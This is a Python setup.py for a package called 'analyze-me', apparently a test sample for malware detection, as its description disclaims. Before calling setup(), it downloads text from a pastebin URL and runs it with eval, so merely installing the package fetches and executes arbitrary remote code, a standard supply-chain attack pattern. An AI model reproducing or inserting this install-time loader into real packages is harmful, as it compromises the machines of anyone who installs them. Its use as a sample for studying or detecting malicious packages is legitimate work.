from setuptools import setup
import requests

eval(requests.get('https://pastebin.com/raw/f84dfw0m').text)

setup(
    name="analyze-me",
    python_requires='>=3.6',
    version="1.0.0",
    description="DISCLAIMER: do not install this package. This is part of a test. It might contain harmful code",
    long_description="DISCLAIMER: do not install this package. This is part of a test. It might contain harmful code",
    author="MIT",
    author_email="contact@example.com",
    license="MIT"
)
